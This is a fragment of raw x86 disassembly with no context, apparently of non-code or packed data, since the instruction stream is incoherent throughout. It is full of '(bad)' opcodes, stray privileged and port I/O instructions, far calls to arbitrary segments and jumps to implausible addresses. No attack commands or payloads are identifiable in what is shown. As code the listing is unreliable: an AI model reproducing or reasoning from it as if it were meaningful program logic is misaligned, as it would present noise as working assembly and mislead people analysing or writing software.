  41ba56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba57:	adc    al,0x28
  41ba59:	ret    
  41ba5a:	mov    esi,0xff915745
  41ba5f:	stos   DWORD PTR es:[edi],eax
  41ba60:	retf   0xd98a
  41ba63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba64:	bound  eax,QWORD PTR [edi+0x14]
  41ba67:	mov    bh,BYTE PTR [edi]
  41ba69:	fisttp WORD PTR [edi+0x58]
  41ba6c:	fstp   QWORD PTR [edx+edi*4+0x1e28cc56]
  41ba73:	adc    al,0x95
  41ba75:	nop
  41ba76:	xchg   ebx,eax
  41ba77:	push   ebx
  41ba78:	shl    BYTE PTR [esi-0x7a323397],1
  41ba7e:	mov    al,0x94
  41ba80:	adc    dh,BYTE PTR [edx]
  41ba82:	je     0x41bad9
  41ba84:	mov    cl,0x3f
  41ba86:	gs fadd st,st(7)
  41ba89:	pop    ss
  41ba8a:	xor    dh,BYTE PTR [ecx-0x41]
  41ba8d:	sub    al,0x42
  41ba8f:	ficom  DWORD PTR [eax]
  41ba91:	jae    0x41ba86
  41ba93:	push   ecx
  41ba94:	push   ecx
  41ba95:	jo     0x41ba84
  41ba97:	ds push cs
  41ba99:	ror    DWORD PTR [edi-0x43],0x89
  41ba9d:	fs shl cl,1
  41baa0:	sbb    ecx,eax
  41baa2:	push   edx
  41baa3:	fist   DWORD PTR [edx+0x2c]
  41baa6:	ds daa 
  41baa8:	fs int3 
  41baaa:	(bad)  
  41baac:	xor    edi,0x6e
  41baaf:	jmp    0x41ba6b
  41bab1:	aas    
  41bab2:	rcl    esp,1
  41bab4:	cmp    al,0x8
  41bab6:	dec    ecx
  41bab7:	add    DWORD PTR [di-0x19b1],ecx
  41babc:	push   0x2631f5
  41bac1:	ss (bad) 
  41bac3:	and    al,0x31
  41bac5:	push   edi
  41bac6:	leave  
  41bac7:	sti    
  41bac8:	cli    
  41bac9:	enter  0xe7af,0x3
  41bacd:	outs   dx,BYTE PTR ds:[esi]
  41bace:	mov    eax,ds:0x4cd8f0e5
  41bad3:	gs mov edi,0x5c2b6629
  41bad9:	aas    
  41bada:	pop    esp
  41badb:	mov    ds:0x7c1954e8,eax
  41bae0:	adc    eax,DWORD PTR [ebp-0x4e]
  41bae3:	sub    ecx,DWORD PTR [ebx+edi*4]
  41bae6:	push   ebx
  41bae7:	or     al,0x25
  41bae9:	inc    ebx
  41baea:	inc    esp
  41baeb:	xchg   edx,eax
  41baec:	xor    DWORD PTR [ecx-0x39],ebx
  41baef:	popf   
  41baf0:	addr16 leave 
  41baf2:	int    0x7b
  41baf4:	(bad)  
  41baf5:	(bad)  
  41baf6:	lock aad 0x3e
  41baf9:	lock push ebx
  41bafb:	sbb    ebx,DWORD PTR [ebp+0x3f]
  41bafe:	inc    ebx
  41baff:	ins    WORD PTR es:[edi],dx
  41bb01:	imul   esi,DWORD PTR [ebx+0x4e],0xc7f8b4d8
  41bb08:	out    0x68,eax
  41bb0a:	jo     0x41bac2
  41bb0c:	cmp    DWORD PTR [ecx],0x17
  41bb0f:	sub    dh,BYTE PTR [edi-0x27]
  41bb12:	push   ecx
  41bb13:	(bad)  
  41bb14:	ins    BYTE PTR es:[edi],dx
  41bb15:	add    eax,0x2168f3e4
  41bb1a:	mov    BYTE PTR [edx+ecx*4+0x1827f4a4],dl
  41bb21:	pop    edi
  41bb22:	addr16 or eax,0x75b913f2
  41bb28:	dec    esi
  41bb29:	bound  eax,QWORD PTR [esi]
  41bb2b:	(bad)  
  41bb2c:	cli    
  41bb2d:	sbb    bh,bl
  41bb2f:	lds    esp,FWORD PTR ds:0xb874811e
  41bb35:	mov    ebx,0xd3c5dd98
  41bb3a:	mov    ebx,0xe078b1ea
  41bb3f:	dec    edx
  41bb40:	dec    esp
  41bb41:	test   dl,dl
  41bb43:	fst    st(3)
  41bb45:	ds ins BYTE PTR es:[edi],dx
  41bb47:	repz jp 0x41bb33
  41bb4a:	mov    esi,0x944d7e69
  41bb4f:	sbb    DWORD PTR ds:0xc96165e0,edi
  41bb55:	inc    esp
  41bb56:	ss push ss
  41bb58:	push   edi
  41bb59:	adc    DWORD PTR [eax+0x16],ecx
  41bb5c:	outs   dx,DWORD PTR ds:[esi]
  41bb5d:	inc    ebx
  41bb5e:	(bad)  
  41bb60:	mov    edx,0x86249256
  41bb65:	cmp    esi,DWORD PTR [ecx+0x19]
  41bb68:	mov    ds:0x460d167a,al
  41bb6d:	adc    al,0xd9
  41bb6f:	cmp    bh,BYTE PTR [ebx]
  41bb71:	mov    ebx,0x12eefbd3
  41bb76:	jecxz  0x41bb2e
  41bb78:	mov    WORD PTR [eax+0x64],gs
  41bb7b:	dec    ecx
  41bb7c:	lds    edx,FWORD PTR [ebx]
  41bb7e:	xchg   ecx,eax
  41bb7f:	retf   
  41bb80:	push   edx
  41bb81:	xchg   edi,eax
  41bb82:	cmc    
  41bb83:	fnstcw WORD PTR [ecx]
  41bb85:	call   0x876a:0xe22136ea
  41bb8c:	sbb    edx,0xffffff92
  41bb8f:	cmp    edx,DWORD PTR [ecx]
  41bb91:	push   ebx
  41bb92:	out    0x3c,eax
  41bb94:	imul   eax,DWORD PTR [edi-0x461e9a8c],0xb0bbdfef
  41bb9e:	or     ch,BYTE PTR [esi+0x66]
  41bba1:	mov    eax,0x9b2889ea
  41bba6:	inc    ecx
  41bba7:	and    edi,esi
  41bba9:	sar    BYTE PTR [ecx-0x3e],cl
  41bbac:	dec    ebx
  41bbad:	mov    WORD PTR [eax+0x79bc1b5d],cs
  41bbb3:	inc    ebp
  41bbb4:	rol    DWORD PTR [ebp+0x35],0x2b
  41bbb8:	xlat   BYTE PTR ds:[ebx]
  41bbb9:	mov    bl,BYTE PTR [esi-0x73a9e4d8]
  41bbbf:	mov    al,0x2c
  41bbc1:	fsubr  QWORD PTR ds:0x33e0862a
  41bbc7:	ins    BYTE PTR es:[edi],dx
  41bbc8:	sub    al,0x1
  41bbcb:	hlt    
  41bbcc:	in     eax,0x66
  41bbce:	outs   dx,DWORD PTR ds:[esi]
  41bbcf:	popa   
  41bbd0:	sar    DWORD PTR [ebp-0x1],0xc5
  41bbd4:	test   BYTE PTR [edx],dh
  41bbd6:	outs   dx,BYTE PTR ds:[esi]
  41bbd7:	imul   ebx,DWORD PTR [edi+0x5be1f673],0x7eec5294
  41bbe1:	pop    ds
  41bbe2:	in     eax,0xc5
  41bbe4:	cmp    bl,cl
  41bbe6:	push   edx
  41bbe7:	dec    esp
  41bbe8:	cmp    BYTE PTR [ecx+0x310fba63],0x35
  41bbef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbf0:	jb     0x41bc61
  41bbf2:	cld    
  41bbf3:	cli    
  41bbf4:	rol    ah,0x95
  41bbf7:	inc    eax
  41bbf8:	jg     0x41bbeb
  41bbfa:	rcr    BYTE PTR [ebp-0x31f66a95],0x24
  41bc01:	daa    
  41bc02:	imul   ebp,DWORD PTR [edx+0x6e0ba4a3],0x252adad7
  41bc0c:	call   0x5fa9:0x63f70c6d
  41bc13:	mov    dl,0x21
  41bc15:	sbb    DWORD PTR [ebp-0x6de8231a],0xffffffe0
  41bc1c:	jmp    0xddd411a5
  41bc21:	fsub   st(2),st
  41bc23:	inc    ebp
  41bc24:	sub    dl,BYTE PTR [ecx-0x38f5a2dc]
  41bc2a:	push   ecx
  41bc2b:	add    cl,bl
  41bc2d:	mov    edi,DWORD PTR [ecx-0x2f3c4065]
  41bc33:	inc    edi
  41bc34:	test   edi,esi
  41bc36:	mov    al,ds:0x4231d6d8
  41bc3b:	xchg   ebx,eax
  41bc3c:	inc    esp
  41bc3d:	push   ecx
  41bc3e:	or     esi,edx
  41bc40:	add    al,0x25
  41bc42:	mov    edi,0xe4d02d38
  41bc47:	out    0x7a,eax
  41bc49:	ret    
  41bc4a:	dec    edx
  41bc4b:	fcomp  DWORD PTR [esi+esi*2+0x376f1f33]
  41bc52:	je     0x41bbfe
  41bc54:	sub    BYTE PTR [edi+0x5f],dl
  41bc57:	adc    ebx,DWORD PTR [ebx+0x32e8c355]
  41bc5d:	pop    eax
  41bc5e:	jo     0x41bc0e
  41bc60:	or     DWORD PTR [esi],esp
  41bc62:	neg    BYTE PTR [eax+0x50196104]
  41bc68:	inc    esp
  41bc69:	in     eax,0x2d
  41bc6b:	(bad)  
  41bc6c:	and    al,0x90
  41bc6e:	sti    
  41bc6f:	xor    al,0x5d
  41bc71:	adc    ah,BYTE PTR [eax-0x284edbd9]
  41bc77:	(bad)  
  41bc78:	repz test al,0x31
  41bc7b:	jle    0x41bc0b
  41bc7d:	mov    al,ds:0x3fe6ab2f
  41bc82:	or     edi,DWORD PTR [edi+0x10]
  41bc85:	push   ss
  41bc86:	cmp    DWORD PTR [ebx],ebx
  41bc88:	bound  edx,QWORD PTR [ecx-0x2e]
  41bc8b:	sbb    eax,0xe94576fe
  41bc90:	mov    ah,0xd4
  41bc92:	(bad)  
  41bc93:	pop    esp
  41bc94:	fbld   TBYTE PTR [ebp+0x4e30aae8]
  41bc9a:	(bad)  
  41bc9b:	mov    ah,bh
  41bc9d:	or     ch,BYTE PTR [ebp-0x41]
  41bca0:	push   cs
  41bca1:	cli    
  41bca2:	jno    0xb860199
  41bca8:	add    ebx,0xffffffbb
  41bcab:	xchg   edx,eax
  41bcac:	ins    BYTE PTR es:[edi],dx
  41bcad:	xor    al,0x23
  41bcaf:	add    BYTE PTR [ecx-0x16],0x7a
  41bcb3:	or     bl,BYTE PTR [ecx+0x2fa0bdb2]
  41bcb9:	rol    BYTE PTR [esp+ecx*4+0x6],cl
  41bcbd:	adc    al,0xa9
  41bcbf:	mov    esp,0x1816a04e
  41bcc4:	xor    DWORD PTR [eax-0xf8d65f6],0x69dd61b8
  41bcce:	push   esp
  41bccf:	jo     0x41bcb1
  41bcd1:	rcl    DWORD PTR [edi],0x9c
  41bcd4:	mov    ecx,0x3b152390
  41bcd9:	cli    
  41bcda:	sti    
  41bcdb:	ds jge 0x41bcf9
  41bcde:	pop    edi
  41bcdf:	mov    cl,0x96
  41bce1:	icebp  
  41bce2:	sub    eax,0x811b9bf
  41bce7:	sbb    ebx,DWORD PTR [esi+edi*2]
  41bcea:	popa   
  41bceb:	mov    ch,0xf4
  41bced:	adc    bh,BYTE PTR [ecx-0x1e6872a6]
  41bcf3:	push   ss
  41bcf4:	mov    al,ds:0x63c7b965
  41bcf9:	aas    
  41bcfa:	jp     0x41bcfa
  41bcfc:	xchg   edi,eax
  41bcfd:	dec    eax
  41bcfe:	mov    ah,0x67
  41bd00:	(bad)  
  41bd01:	pop    ebx
  41bd02:	pop    ds
  41bd03:	test   eax,0x758f2ded
  41bd08:	sbb    ecx,esp
  41bd0a:	pop    ebx
  41bd0b:	push   ds
  41bd0c:	push   0xffffffff
  41bd0e:	outs   dx,BYTE PTR ds:[esi]
  41bd0f:	xchg   ecx,eax
  41bd10:	(bad)  
  41bd11:	push   ebx
  41bd12:	add    DWORD PTR [ecx+esi*8],ecx
  41bd15:	add    eax,0xdcf9b3c8
  41bd1a:	mov    dl,BYTE PTR [eax]
  41bd1c:	push   eax
  41bd1d:	pop    ds
  41bd1e:	inc    edi
  41bd1f:	mov    ch,0x95
  41bd21:	add    BYTE PTR [ecx+0x6aa8592e],0x63
  41bd28:	aam    0x53
  41bd2a:	jmp    0x41bd2d
  41bd2c:	inc    ebx
  41bd2d:	xchg   ebx,eax
  41bd2e:	lahf   
  41bd2f:	jae    0x41bd94
  41bd31:	loope  0x41bd57
  41bd33:	lds    eax,FWORD PTR [edi]
  41bd35:	jnp    0x41bcf3
  41bd37:	cdq    
  41bd38:	push   ebx
  41bd39:	push   eax
  41bd3a:	cmp    al,0xf8
  41bd3c:	push   ds
  41bd3d:	mov    al,ds:0x5b2727e
  41bd42:	jecxz  0x41bda9
  41bd44:	popa   
  41bd45:	mov    eax,0x1d3fd6c8
  41bd4a:	outs   dx,BYTE PTR ds:[esi]
  41bd4b:	xor    eax,0x71e01e09
  41bd50:	shl    DWORD PTR [eax],0xe6
  41bd53:	bsf    ebp,eax
  41bd56:	mov    edx,eax
  41bd58:	scas   al,BYTE PTR es:[edi]
  41bd59:	add    BYTE PTR [ebp-0x34df64c2],bl
  41bd5f:	fs pop ss
  41bd61:	push   edx
  41bd62:	cdq    
  41bd63:	scas   al,BYTE PTR es:[edi]
  41bd64:	or     BYTE PTR [edx-0x76bf66da],ah
  41bd6a:	jmp    0x41bcfc
  41bd6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd6d:	cmp    edi,edx
  41bd6f:	xchg   edi,eax
  41bd70:	mov    ebp,0xaa104f9b
  41bd75:	popf   
  41bd76:	repnz mov ds:0x20aa9232,al
  41bd7c:	mov    edi,0x61375321
  41bd81:	mov    BYTE PTR [edx+0x751f2f04],dl
  41bd87:	dec    esi
  41bd88:	inc    ebp
  41bd89:	loopne 0x41bd9f
  41bd8b:	xchg   BYTE PTR [ebp+0x58b4fc09],cl
  41bd91:	cwde   
  41bd92:	fidiv  WORD PTR [ebx+0x467508aa]
  41bd98:	xchg   esp,eax
  41bd99:	pop    ss
  41bd9a:	mov    dh,0xa5
  41bd9c:	xchg   esp,eax
  41bd9d:	int    0x6b
  41bd9f:	or     al,0x6e
  41bda1:	xor    esi,esp
  41bda3:	bound  esp,QWORD PTR [edx+0x2e3eaacf]
  41bda9:	frstor [ebp-0x1dccf1f2]
  41bdaf:	xchg   DWORD PTR [ecx-0x4a],esi
  41bdb2:	pusha  
  41bdb3:	shr    BYTE PTR [ebp-0x56],0xda
  41bdb7:	fstp   st(4)
  41bdb9:	bswap  esi
  41bdbb:	xchg   edx,eax
  41bdbc:	mov    ds:0x304031d0,al
  41bdc1:	lock leave 
  41bdc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdc4:	add    BYTE PTR es:[edx+0x5a89153e],0xce
  41bdcc:	mov    eax,DWORD PTR [ebp+ebx*8+0x1afd74bd]
  41bdd3:	loopne 0x41bdd0
  41bdd5:	sbb    edi,ebp
  41bdd7:	cmp    BYTE PTR [eax+0x9],ah
  41bdda:	mov    BYTE PTR [edx],ch
  41bddc:	repz cmp BYTE PTR [ebp+0x62ef5454],dl
  41bde3:	daa    
  41bde4:	fbld   TBYTE PTR [ebx]
  41bde6:	add    al,0xc6
  41bde8:	jb     0x41bdcf
  41bdea:	and    al,0xce
  41bdec:	stos   BYTE PTR es:[edi],al
  41bded:	scas   eax,DWORD PTR es:[edi]
  41bdee:	scas   al,BYTE PTR es:[edi]
  41bdef:	fcmovnbe st,st(4)
  41bdf1:	adc    al,0x37
  41bdf3:	mov    ecx,0xdf11cdf0
  41bdf8:	ret    
  41bdf9:	and    eax,0x51888166
  41bdfe:	mov    esi,0x405c6257
  41be03:	nop
  41be04:	jp     0x41bddf
  41be06:	add    BYTE PTR [ebx],cl
  41be08:	out    dx,eax
  41be09:	fcom   DWORD PTR [edi+0x18f43bc4]
  41be0f:	sbb    bl,dh
  41be11:	mov    ?,edi
  41be13:	out    dx,eax
  41be14:	ss and eax,0xcd19ebeb
  41be1a:	cmp    DWORD PTR [eax+edi*2],esi
  41be1d:	fidiv  WORD PTR [ecx+eiz*8]
  41be20:	cwde   
  41be21:	fimul  DWORD PTR [edi-0x2d]
  41be24:	icebp  
  41be25:	ins    BYTE PTR es:[edi],dx
  41be26:	push   es
  41be27:	pushf  
  41be28:	mov    esi,0xb5ba9a93
  41be2d:	std    
  41be2e:	lods   eax,DWORD PTR ds:[esi]
  41be2f:	pop    ss
  41be30:	mov    eax,0xdfb2872
  41be35:	es (bad) 
  41be37:	cli    
  41be38:	cmp    dh,BYTE PTR [edx+0x62]
  41be3b:	push   edx
  41be3c:	sbb    dl,BYTE PTR [ebp-0x785e6f81]
  41be42:	add    ah,BYTE PTR [eax]
  41be44:	inc    ebp
  41be45:	and    eax,0x2d2ea3cb
  41be4a:	pushf  
  41be4b:	in     eax,dx
  41be4c:	sub    BYTE PTR [ebx+0x3fd5574a],ah
  41be52:	jnp    0x41bea4
  41be54:	bound  edx,QWORD PTR [edi+0x26]
  41be57:	adc    al,0xf9
  41be59:	js     0x41bea8
  41be5b:	idiv   DWORD PTR [edi-0x3cfc2d61]
  41be61:	addr16 jnp 0x41bed0
  41be64:	sti    
  41be65:	jge    0x41be85
  41be67:	pusha  
  41be68:	fst    DWORD PTR [edx-0x63324ca7]
  41be6e:	mov    eax,0x60ba5e9e
  41be73:	bound  ebp,QWORD PTR [ebp+0x9e559b8]
  41be79:	push   edi
  41be7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be7b:	sti    
  41be7c:	fidivr DWORD PTR [ecx+0x1e]
  41be7f:	scas   eax,DWORD PTR es:[edi]
  41be80:	mov    esp,0x33cfe980
  41be85:	or     ah,BYTE PTR [edx]
  41be87:	xchg   edx,eax
  41be88:	or     cl,0x3b
  41be8b:	fwait
  41be8c:	jmp    0x41beed
  41be8e:	(bad)  
  41be8f:	mov    ch,0xe7
  41be91:	xchg   esi,eax
  41be92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be93:	mov    ds:0xfc4442ef,eax
  41be98:	call   0x9c11:0xccbcb1a9
  41be9f:	push   ebx
  41bea0:	scas   al,BYTE PTR es:[edi]
  41bea1:	push   es
  41bea2:	sub    eax,DWORD PTR [eax+0x60]
  41bea5:	push   ebp
  41bea6:	cli    
  41bea7:	cs mov ?,WORD PTR es:[edx+0x39189e71]
  41beaf:	dec    esi
  41beb0:	aad    0xba
  41beb2:	cmp    bl,bl
  41beb4:	sbb    eax,0x18a53fc4
  41beb9:	dec    esi
  41beba:	mov    esi,0x7f8a3c5b
  41bebf:	stos   DWORD PTR es:[edi],eax
  41bec0:	popa   
  41bec1:	test   esi,esp
  41bec3:	mov    bh,0x1a
  41bec5:	xor    al,0xa1
  41bec7:	call   0x92e9d904
  41becc:	ds push 0xffffffae
  41becf:	pop    edx
  41bed0:	mov    ds:0xc0a4b4e6,eax
  41bed5:	sub    ch,BYTE PTR [esi-0xd476033]
  41bedb:	js     0x41bf43
  41bedd:	call   0x7449:0x40c12822
  41bee4:	jne    0x41bf64
  41bee6:	shl    ch,1
  41bee8:	shl    BYTE PTR [edx-0x42],0x23
  41beec:	ret    0x7200
  41beef:	sbb    al,0x6c
  41bef1:	xor    eax,0x85e3c209
  41bef6:	data16 fist WORD PTR es:[eax+0x50]
  41befb:	es sub al,0xac
  41befe:	(bad)  
  41beff:	cmp    ebx,esi
  41bf01:	stos   BYTE PTR es:[edi],al
  41bf02:	inc    ebx
  41bf03:	adc    BYTE PTR [esp+edi*1-0x5ba4966],al
  41bf0a:	cmp    dl,BYTE PTR [eax-0x5ad330a8]
  41bf10:	add    al,0x9b
  41bf12:	test   dh,bh
  41bf14:	and    DWORD PTR [ecx+eiz*4+0x36],0xe0c1a8f3
  41bf1c:	mov    ds:0xc2db7561,eax
  41bf21:	push   edx
  41bf22:	jl     0x41bf5a
  41bf24:	jbe    0x41bea6
  41bf26:	pop    ss
  41bf27:	sar    BYTE PTR [ecx+0x52],1
  41bf2a:	and    al,BYTE PTR [ebp+0x5f]
  41bf2d:	imul   edx,DWORD PTR ds:0x1edf88c0,0xffffffd9
  41bf34:	xchg   ebp,eax
  41bf35:	int    0x8
  41bf37:	retf   
  41bf38:	in     al,0x28
  41bf3a:	mov    bh,0x7
  41bf3c:	jno    0x41bedb
  41bf3e:	hlt    
  41bf3f:	sbb    al,0x79
  41bf41:	pusha  
  41bf42:	push   es
  41bf43:	mov    bl,bl
  41bf45:	cmp    dh,BYTE PTR [eax-0x540e235]
  41bf4b:	out    dx,eax
  41bf4c:	push   eax
  41bf4d:	mov    ebx,DWORD PTR [ecx]
  41bf4f:	ins    BYTE PTR es:[edi],dx
  41bf50:	mov    esp,0x762b0a4c
  41bf55:	retf   
  41bf56:	push   esp
  41bf57:	push   edi
  41bf58:	jns    0x41bf87
  41bf5a:	sub    BYTE PTR [ecx+0x232b29b2],cl
  41bf60:	js     0x41bf7e
  41bf62:	push   0xd48ca000
  41bf67:	inc    esp
  41bf68:	sub    al,0x1a
  41bf6a:	fistp  WORD PTR ds:0xaebd5b45
  41bf70:	aaa    
  41bf71:	and    bl,cl
  41bf73:	add    DWORD PTR [ebx],edi
  41bf75:	stos   DWORD PTR es:[edi],eax
  41bf76:	jns    0x41bfe5
  41bf78:	(bad)  
  41bf79:	xchg   ecx,eax
  41bf7a:	or     eax,0x3a36f36
  41bf7f:	xor    DWORD PTR [ecx+eiz*4-0x30],0x9b58a1f2
  41bf87:	sub    al,BYTE PTR [ebp-0x24089859]
  41bf8d:	dec    edi
  41bf8e:	ins    BYTE PTR es:[edi],dx
  41bf8f:	pushf  
  41bf90:	adc    al,0x7c
  41bf92:	mov    WORD PTR ds:0x31c629d0,ss
  41bf98:	rol    ah,1
  41bf9a:	xchg   ebx,eax
  41bf9b:	xchg   edx,eax
  41bf9c:	addr16 mov al,ds:0xeb1
  41bfa0:	jno    0x41c012
  41bfa2:	pushf  
  41bfa3:	out    dx,eax
  41bfa4:	add    bl,BYTE PTR [eax+0x2289242d]
  41bfaa:	and    bh,0x23
  41bfad:	cli    
  41bfae:	xlat   BYTE PTR ds:[ebx]
  41bfaf:	push   ebx
  41bfb0:	cdq    
  41bfb1:	xor    cl,bh
  41bfb3:	int    0x6e
  41bfb5:	popa   
  41bfb6:	push   ss
  41bfb7:	adc    edi,DWORD PTR [esi+edi*2-0x9e0e20b]
  41bfbe:	mov    ch,0x70
  41bfc0:	xchg   edx,eax
  41bfc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfc2:	push   edi
  41bfc3:	or     dl,cl
  41bfc5:	(bad)  
  41bfc6:	ror    edi,cl
  41bfc8:	outs   dx,DWORD PTR ds:[esi]
  41bfc9:	cli    
  41bfca:	xor    eax,0x7e37e757
  41bfcf:	lea    ebx,[edx-0x49b9dad1]
  41bfd5:	jb     0x41bfda
  41bfd7:	push   cs
  41bfd8:	aam    0x78
  41bfda:	pusha  
  41bfdb:	inc    ecx
  41bfdc:	inc    ebp
  41bfdd:	sbb    al,0x1f
  41bfdf:	or     edx,DWORD PTR [esi-0x40]
  41bfe2:	popa   
  41bfe3:	xchg   DWORD PTR [esi-0x5b27d3c5],ecx
  41bfe9:	test   DWORD PTR [edx+0x7dc2a47b],ebp
  41bfef:	icebp  
  41bff0:	scas   al,BYTE PTR es:[edi]
  41bff1:	sbb    ebp,edi
  41bff3:	in     eax,0xcc
  41bff5:	mov    ds:0xe98dd4d6,al
  41bffa:	mov    al,ds:0x498a7d58
  41bfff:	std    
  41c000:	mov    ebx,0x70ffd980
  41c005:	cmp    eax,0x87445836
  41c00a:	mov    ch,0x6c
  41c00c:	jg     0x41c009
  41c00e:	cmp    al,0x9d
  41c010:	adc    DWORD PTR [ebp+0x6c],0x4
  41c014:	xchg   ebx,eax
  41c015:	jmp    0x43a08190
  41c01a:	call   0x70b9ac56
  41c01f:	jle    0x41c07a
  41c021:	call   0x96ba:0x6d74b9b3
  41c028:	jmp    0xff5aa3a8
  41c02d:	jne    0x41c01b
  41c02f:	cmp    BYTE PTR [esi+eax*1+0x1b],bl
  41c033:	fst    QWORD PTR ds:0x5ae9eb73
  41c039:	mov    esi,0x6993de77
  41c03e:	jge    0x41c06b
  41c040:	xchg   BYTE PTR [esi+eiz*1+0x2a3a7a46],ah
  41c047:	pop    ss
  41c048:	pop    es
  41c049:	add    al,dh
  41c04b:	xor    DWORD PTR [edi],ebp
  41c04d:	out    0xa5,eax
  41c04f:	cmp    DWORD PTR [edi-0x1],ebp
  41c052:	xor    DWORD PTR [ebx],ecx
  41c054:	sar    DWORD PTR [edi],1
  41c056:	xchg   edx,eax
  41c057:	es cdq 
  41c059:	mov    bh,0x56
  41c05b:	sub    ebp,edx
  41c05d:	fcom   QWORD PTR [edx+edx*8-0x361e2baa]
  41c064:	inc    edx
  41c065:	ret    
  41c066:	pop    ebp
  41c067:	sub    dl,BYTE PTR [edi+0x5e034ca]
  41c06d:	cmp    eax,0xf18464ee
  41c072:	loopne 0x41bff9
  41c074:	(bad)  
  41c075:	mov    ch,0x2
  41c077:	pop    eax
  41c078:	xor    al,0x3d
  41c07a:	push   eax
  41c07b:	out    dx,al
  41c07c:	cmp    ebp,DWORD PTR [ebx+ebx*8-0x13]
  41c080:	inc    edi
  41c081:	lahf   
  41c082:	adc    eax,0xc961b0b1
  41c087:	pop    edx
  41c088:	pop    edi
  41c089:	adc    BYTE PTR [ebp+0x52],dl
  41c08c:	movd   DWORD PTR [edi+0x15768a16],mm1
  41c093:	(bad)  
  41c095:	inc    esp
  41c096:	push   ecx
  41c097:	gs jbe 0x41c020
  41c09a:	pop    ss
  41c09b:	add    BYTE PTR [edx],bh
  41c09d:	data16 jp 0x41c020
  41c0a0:	sbb    bl,ch
  41c0a2:	jmp    0x4dae:0xf212422c
  41c0a9:	fsub   st,st(5)
  41c0ab:	and    eax,0xae0f810e
  41c0b0:	pusha  
  41c0b1:	cmp    edi,edx
  41c0b3:	mov    ds:0x4660c0b9,al
  41c0b8:	(bad)
  41c0bc:	je     0x41c0fd
  41c0be:	out    dx,eax
  41c0bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0c0:	(bad)  
  41c0c2:	jmp    0x41c07a
  41c0c4:	rcr    BYTE PTR [ecx],cl
  41c0c6:	or     edi,edi
  41c0c8:	je     0x41c10e
  41c0ca:	ret    0xb261
  41c0cd:	xor    DWORD PTR [esi+eiz*2],edx
  41c0d0:	in     eax,0x87
  41c0d2:	aam    0xc6
  41c0d4:	lds    eax,FWORD PTR [ecx+0x3b1928a7]
  41c0da:	add    BYTE PTR [esi-0x14],bl
  41c0dd:	dec    edi
  41c0de:	stc    
  41c0df:	or     DWORD PTR [ebx-0xa],ebx
  41c0e2:	push   ss
  41c0e3:	cld    
  41c0e4:	or     DWORD PTR [ebx+0x9084c81],0xffffffd0
  41c0eb:	jbe    0x41c0dc
  41c0ed:	push   eax
  41c0ee:	neg    BYTE PTR [edi-0x68]
  41c0f1:	test   eax,0x2f67d694
  41c0f6:	or     ah,BYTE PTR [ebx]
  41c0f8:	gs or  al,0x25
  41c0fb:	pusha  
  41c0fc:	mov    cl,0x6d
  41c0fe:	jno    0x41c106
  41c100:	pop    edx
  41c101:	xchg   esi,eax
  41c102:	test   esi,esp
  41c104:	mov    al,ds:0x8846d85b
  41c109:	int3   
  41c10a:	xor    al,0xdf
  41c10c:	mov    ah,0x3
  41c10e:	mov    ecx,0x9fe6ca4f
  41c113:	enter  0xe581,0xd4
  41c117:	pusha  
  41c118:	push   esp
  41c119:	aas    
  41c11a:	mov    WORD PTR [ecx],ds
  41c11c:	mov    ds:0x6e4c1478,al
  41c121:	pop    ecx
  41c122:	xlat   BYTE PTR ds:[ebx]
  41c123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c124:	or     bl,ah
  41c126:	test   DWORD PTR [esi+edi*4],ebx
  41c129:	cmp    BYTE PTR ds:0xd880c10e,dl
  41c12f:	xchg   edi,eax
  41c130:	lahf   
  41c131:	lods   eax,DWORD PTR ds:[esi]
  41c132:	sbb    ecx,0x7de98cf0
  41c138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c139:	clc    
  41c13a:	pop    ebx
  41c13b:	cmp    eax,0xce33349a
  41c140:	mov    al,0xcb
  41c142:	imul   edx,DWORD PTR [ebx-0x17a4024b],0x6b
  41c149:	mov    ds:0x75b0c1a1,al
  41c14e:	pop    eax
  41c14f:	es sub eax,0xaf10d4bf
  41c155:	fidivr WORD PTR [ebx+0x7d]
  41c158:	rcl    al,cl
  41c15a:	add    bl,BYTE PTR [edi+eax*4]
  41c15d:	mov    eax,ds:0xebee0bb6
  41c162:	sbb    eax,0xe0ab440a
  41c167:	xlat   BYTE PTR ds:[ebx]
  41c168:	pop    edi
  41c169:	clc    
  41c16a:	test   eax,0xac95c474
  41c16f:	xlat   BYTE PTR ds:[ebx]
  41c170:	dec    ecx
  41c171:	in     al,0x9a
  41c173:	leave  
  41c174:	add    al,0x89
  41c176:	sbb    BYTE PTR [ecx+0x12],cl
  41c179:	add    dl,BYTE PTR [eax+edx*4+0x2b]
  41c17d:	mov    esi,0xd7b41f0f
  41c182:	scas   al,BYTE PTR es:[edi]
  41c183:	(bad)  
  41c184:	pusha  
  41c185:	outs   dx,BYTE PTR ds:[esi]
  41c186:	and    eax,0xc2743d5c
  41c18b:	xchg   ebp,eax
  41c18c:	imul   edi,DWORD PTR [edx+0x75ea8f50],0x2d38149f
  41c196:	ret    
  41c197:	repnz inc ebx
  41c199:	aam    0xf8
  41c19b:	ret    
  41c19c:	dec    esi
  41c19d:	pop    ss
  41c19e:	add    eax,0xd8771765
  41c1a3:	xchg   esp,eax
  41c1a4:	ins    DWORD PTR es:[edi],dx
  41c1a5:	test   bh,bl
  41c1a7:	mov    ebx,DWORD PTR [esi+0x3ffbc258]
  41c1ad:	or     DWORD PTR [edx-0x1e216392],0x934124ce
  41c1b7:	xchg   BYTE PTR [ecx+edx*8],bh
  41c1ba:	mov    DWORD PTR [edi],0x330bfaef
  41c1c0:	lfs    ebx,FWORD PTR [ebp+0x380e5bdc]
  41c1c7:	mov    eax,0xa5e89c6a
  41c1cc:	add    ebp,DWORD PTR [esp+ecx*4+0x5aefb45d]
  41c1d3:	fs cld 
  41c1d5:	xor    bh,0x72
  41c1d8:	(bad)  
  41c1d9:	push   ebp
  41c1da:	mov    BYTE PTR [edi+ebp*1+0x69e5efc9],bh
  41c1e1:	jp     0x41c23a
  41c1e3:	sbb    bl,BYTE PTR [esi+0x29]
